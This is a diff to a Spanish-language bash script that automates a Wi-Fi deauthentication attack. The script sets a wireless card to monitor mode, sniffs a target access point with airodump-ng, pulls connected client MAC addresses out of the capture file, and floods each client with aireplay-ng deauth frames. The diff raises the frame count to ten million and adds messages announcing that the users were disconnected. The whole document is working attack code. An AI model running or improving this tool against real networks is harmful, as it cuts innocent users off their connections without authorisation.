@@ -30,7 +30,6 @@ function ctrl_c(){
 	escape
 }
 
-
 modo_monitor ()
 {
 printf "${yellowColour}[#]${endColour}${greenColour} Configurando modo monitor ${endColour}\n"
@@ -43,8 +42,9 @@ inicio_ataque
 
 olfateo ()
 {
-sudo airodump-ng --bssid $1 --channel $2 --write captura $interface
-sudo killall airodump-ng
+sudo airodump-ng --bssid $1 --channel $2 --write captura $interface &
+sleep 5
+sudo killall airodump-ng 
 sleep 1
 ataque
 }
@@ -59,13 +59,17 @@ lineas=$var
 resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
 	if [ "$resultado" = ":" ]; then
 	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
-	sudo aireplay-ng --deauth 100000  -a $victima -c $direccion $interface &>/dev/null&
+	sudo aireplay-ng --deauth 10000000  -a $victima -c $direccion $interface &>/dev/null&
+	printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
+	printf "${redColour}[>:)]${endColour}${grayColour} Presione ctrl + c para salir cuando lo desee ${endColour}\n"
+	sleep 100000
 	else
 	break
 	fi
 let "var++"
 
 done
+escape
 }
 
 inicio_ataque ()
@@ -83,8 +87,6 @@ read canal
 olfateo $victima $canal
 }
 
-
-
 dependencias ()
 {
 if [ $(command -v aircrack-ng) ]; then
@@ -100,7 +102,6 @@ sleep 2
 escape
 fi
 }
-
 
 escape ()
 {
@@ -130,7 +131,6 @@ sleep 1
 printf "${blueColour}[*]${endColour}${grayColour} Revisando paquetes necesarios.......${endColour}\n"
 sleep 1
 }
-
 #----------------------------------------------------
 #Fin zona de funciones
 
